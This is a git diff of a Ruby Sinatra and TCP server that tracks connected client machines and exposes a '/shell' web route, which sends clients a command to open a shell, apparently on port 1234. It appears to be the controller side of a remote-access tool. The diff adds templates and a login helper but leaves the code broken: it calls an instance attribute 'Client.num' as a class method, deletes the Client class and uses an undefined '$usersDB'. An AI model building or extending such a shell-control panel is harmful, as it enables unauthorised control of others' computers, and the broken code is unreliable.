@@ -1,6 +1,4 @@
-require 'socket'
-require 'sinatra'
-require 'threads'
+require_relative('app/controllers/controller')
 
 #TCP Server variables
 $stdout.sync = true
@@ -14,32 +12,6 @@ $semaphore = Mutex.new
 pcList = []
 $clientsList = []
 
-class Client
-  # @Instance variable
-  # @@Class variable
-  @@clientCount = 0
-  attr_accessor :name
-  attr_accessor :num
-
-  def initialize(sockt)
-    @sockt = sockt
-    @num = @@clientCount
-    @@clientCount += 1
-  end
-
-  def self.dead
-    @@clientCount -= 1
-  end
-
-  def self.quantity
-    return @@clientCount
-  end
-
-  def send(msg)
-    @sockt.puts(msg)
-  end
-end
-
 $loopThread = Thread.new {
   loop do
     Thread.start(server.accept) do |client|
@@ -49,7 +21,7 @@ $loopThread = Thread.new {
         while line = client.gets
           if line[0..10] == "Polaczono z"
             pcList << line[12..-2]
-            $semaphore.synchronize { $clientsList[(Client.quantity - 1)].name = line[12..-2] }
+            $semaphore.synchronize { $clientsList[Client.num].name = line[12..-2] }
           end
         end
       rescue
@@ -57,9 +29,9 @@ $loopThread = Thread.new {
       end
     end
   end
-  socket.close
-  server.closes
+  server.close
 }
+
 
 class MyServer < Sinatra::Base
 
@@ -73,12 +45,27 @@ class MyServer < Sinatra::Base
   end
 
   get '/' do
-      "We got #{Client.quantity} clients. #{$clientsList[(Client.quantity - 1)].name}"
+      erb :home
   end
 
   get '/shell' do
-    "Trying open shell on port 1234"
-    $semaphore.synchronize { $clientsList[(Client.quantity - 1)].send("shell") }
+    $semaphore.synchronize { $clientsList[Client.num].send("shell") }
+    erb :site_after
+  end
+
+  helpers do
+    def current_user
+      if session[:user_id]
+        $usersDB.where(:id => session[:user_id]).all[0]
+      else
+        nil
+      end
+    end
+  end
+
+  not_found do
+    status 404
+    redirect '/'
   end
 
   run!
